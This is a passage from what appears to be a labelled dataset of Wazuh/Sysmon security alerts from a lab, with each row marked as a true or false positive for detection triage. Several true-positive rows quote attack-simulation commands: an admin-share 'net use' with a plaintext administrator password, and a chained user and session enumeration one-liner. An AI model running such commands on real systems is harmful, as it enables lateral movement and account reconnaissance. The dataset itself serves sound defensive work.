User: NT AUTHORITY\SYSTEM"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"A C:\\Windows\\System32\\net.exe binary was started by a Windows cmd shell 3 Low A C:\\Windows\\System32\\net.exe binary was started by a Windows cmd shell 92036 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client net  use \\\\Target\\C$ P@ssw0rd1 /u:DOMAIN\\Administrator cmd.exe  /c \""net use \\\\Target\\C$ P@ssw0rd1 /u:DOMAIN\\Administrator\"" C:\\Windows\\System32\\net.exe C:\\Windows\\System32\\cmd.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2025-07-06 13:49:06.722
ProcessGuid: {ff3427f9-7ed2-686a-fd05-000000001600}
ProcessId: 5628
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.26100.4202 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net  use \\Target\C$ P@ssw0rd1 /u:DOMAIN\Administrator
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-5f92-686a-d1e8-3b0200000000}
LogonId: 0x23BE8D1
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA1=EE89579561980FCD4E9A8D4FDB147134A289EC0F,MD5=864842D77174D93A0EABF89879A43569,SHA256=2F3D1A52FC7D1DDFAB34B290BCEB31F03E13B658B31C3914E954DBA877009F26,IMPHASH=EF46B86C2346DA0A991DE4B78AAF4E75
ParentProcessGuid: {ff3427f9-7ed2-686a-fc05-000000001600}
ParentProcessId: 8364
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe  /c ""net use \\Target\C$ P@ssw0rd1 /u:DOMAIN\Administrator""
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Windows command prompt started by an abnormal process 4 Low Windows command prompt started by an abnormal process 92052 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client \""cmd.exe\"" /c cmd.exe /C whoami &amp; wmic useraccount get /ALL &amp; quser /SERVER:\""localhost\"" &amp; quser &amp; qwinsta.exe /server:localhost &amp; qwinsta.exe &amp; for /F \""tokens=1,2\"" %%i in ('qwinsta /server:localhost ^| findstr \""Active Disc\""') do @echo %%i | find /v \""#\"" | find /v \""console\"" || echo %%j &gt; computers.txt &amp; @FOR /F %%n in (computers.txt) DO @FOR /F \""tokens=1,2\"" %%i in ('qwinsta /server:%%n ^| findstr \""Active Disc\""') do @echo %%i | find /v \""#\"" | find /v \""console\"" || echo %%j &gt; usernames.txt \""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1027,technique_name=Obfuscated Files or Information
UtcTime: 2025-07-05 13:02:35.164
ProcessGuid: {ff3427f9-226b-6869-8f01-000000001500}
ProcessId: 9176
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.4202 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c cmd.exe /C whoami & wmic useraccount get /ALL & quser /SERVER:""localhost"" & quser & qwinsta.exe /server:localhost & qwinsta.exe & for /F ""tokens=1,2"" %%i in ('qwinsta /server:localhost ^| findstr ""Active Disc""') do @echo %%i | find /v ""#"" | find /v ""console"" || echo %%j > computers.txt & @FOR /F %%n in (computers.txt) DO @FOR /F ""tokens=1,2"" %%i in ('qwinsta /server:%%n ^| findstr ""Active Disc""') do @echo %%i | find /v ""#"" | find /v ""console"" || echo %%j > usernames.txt
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-2071-6869-6f2f-080000000000}
LogonId: 0x82F6F
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6
ParentProcessGuid: {ff3427f9-20c8-6869-f800-000000001500}
ParentProcessId: 2440
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Executable file dropped in Users\Public folder 12 High Executable file dropped in Users\Public folder 92207 sysmon sysmon_eid11_detections windows windows_eventchannel Win11Client C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\Install\\{46DA5EF5-4446-47E8-9F85-F3B28C842B0C}\\EDGEMITMP_544A2.tmp\\setup.exe C:\\Users\\Public\\Desktop\\Microsoft Edge.lnk NT AUTHORITY\\SYSTEM ""File created:
RuleName: -
UtcTime: 2025-07-03 09:03:39.483
ProcessGuid: {ff3427f9-476b-6866-6602-000000001200}
ProcessId: 6260
Image: C:\Program Files (x86)\Microsoft\EdgeUpdate\Install\{46DA5EF5-4446-47E8-9F85-F3B28C842B0C}\EDGEMITMP_544A2.tmp\setup.exe
TargetFilename: C:\Users\Public\Desktop\Microsoft Edge.lnk
CreationUtcTime: 2025-06-28 12:48:00.300
User: NT AUTHORITY\SYSTEM"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"Suspicious Windows cmd shell execution 3 Low Suspicious Windows cmd shell execution 92032 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client wscript  \""C:\\AtomicRedTeam\\atomics\\T1059.007\\src\\sys_info.js\"" \""cmd.exe\"" /c wscript \""C:\\AtomicRedTeam\\atomics\\T1059.007\\src\\sys_info.js\"" C:\\Windows\\System32\\wscript.exe C:\\Windows\\System32\\cmd.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-05 13:01:23.197
ProcessGuid: {ff3427f9-2223-6869-8901-000000001500}
ProcessId: 4496
Image: C:\Windows\System32\wscript.exe
FileVersion: 5.812.10240.16384
Description: Microsoft ® Windows Based Script Host
Product: Microsoft ® Windows Script Host
Company: Microsoft Corporation
OriginalFileName: wscript.exe
CommandLine: wscript  ""C:\AtomicRedTeam\atomics\T1059.007\src\sys_info.js""
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-2071-6869-6f2f-080000000000}
LogonId: 0x82F6F
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=F17CFCD2BDA29421AD37F8764C514396A1DEA7C9,MD5=60933788CB36C3EE2199626C5EC8ADA0,SHA256=7D31A31136319D0A277C7FB0E9BBCB46BA3535A42AEB0307FED70F92649F4162,IMPHASH=EE6DDCBA60642B0ADD3CAB9EA721BEE2
ParentProcessGuid: {ff3427f9-2223-6869-8701-000000001500}
ParentProcessId: 8152
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c wscript ""C:\AtomicRedTeam\atomics\T1059.007\src\sys_info.js""
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
Host-based anomaly detection event (rootcheck). 7 Medium Host-based anomaly detection event (rootcheck). 510 ossec rootcheck rootcheck Linux-Server Trojaned version of file '/usr/bin/w' detected. Signature used: 'uname -a|proc\.h|bash' (Generic). rootcheck,1,TP
"Application Compatibility Database launched 12 High Application Compatibility Database launched 92058 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client C:\\WINDOWS\\System32\\sdbinst.exe -m -bg C:\\WINDOWS\\system32\\svchost.exe -k LocalSystemNetworkRestricted -p -s PcaSvc C:\\Windows\\System32\\sdbinst.exe C:\\Windows\\System32\\svchost.exe NT AUTHORITY\\SYSTEM ""Process Create:
RuleName: technique_id=T1546.011,technique_name=Application Shimming
UtcTime: 2025-07-03 11:10:35.140
ProcessGuid: {ff3427f9-652b-6866-d502-000000001200}
ProcessId: 10104
Image: C:\Windows\System32\sdbinst.exe
FileVersion: 10.0.26100.4202 (WinBuild.160101.0800)
Description: Application Compatibility Database Installer
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: sdbinst.exe
CommandLine: C:\WINDOWS\System32\sdbinst.exe -m -bg
CurrentDirectory: C:\WINDOWS\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {ff3427f9-3a61-6866-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=9B6CFCEC6447B8B6A8577B3B38B56B54932DB155,MD5=26543039B49E72BCEF16952574B727F1,SHA256=07AC8EC62231A05CC715A276BF4506F10136C4D8C93555245A8FD86D175D794C,IMPHASH=1B6EE3C1899EA90A8A3811555E1DA64E
ParentProcessGuid: {ff3427f9-3ae5-6866-ef00-000000001200}
ParentProcessId: 788
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\WINDOWS\system32\svchost.exe -k LocalSystemNetworkRestricted -p -s PcaSvc
ParentUser: NT AUTHORITY\SYSTEM"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"Executable dropped in Windows root folder 6 Low Executable dropped in Windows root folder 92217 sysmon sysmon_eid11_detections windows windows_eventchannel Win11Client C:\\WINDOWS\\System32\\svchost.exe C:\\Windows\\SoftwareDistribution\\Download\\Install\\AM_Delta_Patch_1.431.395.0.exe NT AUTHORITY\\SYSTEM ""File created:
RuleName: -
UtcTime: 2025-07-04 15:45:55.355
ProcessGuid: {ff3427f9-f4b8-6867-1600-000000001300}
ProcessId: 1256
Image: C:\WINDOWS\System32\svchost.exe
TargetFilename: C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.431.395.0.exe
CreationUtcTime: 2025-07-04 15:45:55.355
User: NT AUTHORITY\SYSTEM"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
